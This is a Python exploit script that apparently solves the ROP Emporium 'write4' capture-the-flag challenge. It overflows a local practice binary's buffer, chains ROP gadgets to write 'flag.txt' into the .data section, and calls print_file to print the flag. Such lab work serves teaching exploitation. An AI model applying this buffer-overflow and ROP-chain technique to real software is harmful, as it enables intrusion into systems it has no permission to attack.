import re
import struct
from subprocess import PIPE, Popen

FILE_PATH = "./write4"

JUNK = b"A" * 40

# rabin2 -S ./write4 | grep -P "\.data" | awk '{print $4}'
DATA_SECTION_1 = struct.pack("<Q", 0x00601028)
DATA_SECTION_2 = struct.pack("<Q", 0x00601028 + 0x00000004)
# ROPgadget --binary ./write4 | grep "pop rdi" | awk '{print $1}'
POP_RDI = struct.pack("<Q", 0x0000000000400693)
# ROPgadget --binary ./write4 | grep "pop rsi ; pop r15 ; ret" | awk '{print $1}'
POP_RSI_R15 = struct.pack("<Q", 0x0000000000400691)
# rabin2 -i ./write4 | grep print_file | awk '{print $2}'
PRINT_FILE = struct.pack("<Q", 0x00400510)
# 0th argument of the print_file function (stdout)
ZERO = struct.pack("<Q", 0x0)
# ROPgadget --binary ./write4 | grep -P "mov dword ptr \[rsi\], edi ; ret" | awk '{print $1}'
MOV_EDI_TO_RSI_PTR = struct.pack("<Q", 0x0000000000400629)
# ROPgadget --binary ./write4 | grep -P "mov qword ptr \[r14\], r15 ; ret" | awk '{print $1}'
MOV_R15_TO_R14_PTR = struct.pack("<Q", 0x0000000000400628)
# ROPgadget --binary ./write4 | grep -P ": pop r14 ; pop r15 ; ret" | awk '{print $1}'
POP_R14_R15 = struct.pack("<Q", 0x0000000000400690)


FILE_NAME = b"flag.txt"

payload = JUNK
payload += POP_R14_R15 + DATA_SECTION_1 + FILE_NAME  # r14 = data_ptr, r15 = file_name
payload += MOV_R15_TO_R14_PTR  # file_name in data
payload += POP_RDI + DATA_SECTION_1  # rdi = file_name
payload += POP_RSI_R15 + ZERO + ZERO  # rsi = 0
payload += PRINT_FILE

p = Popen(FILE_PATH, stdout=PIPE, stdin=PIPE, stderr=PIPE)
reply = p.communicate(payload)[0].decode()
flag = re.findall(r"ROPE{.+}", reply)[0]
print(flag)
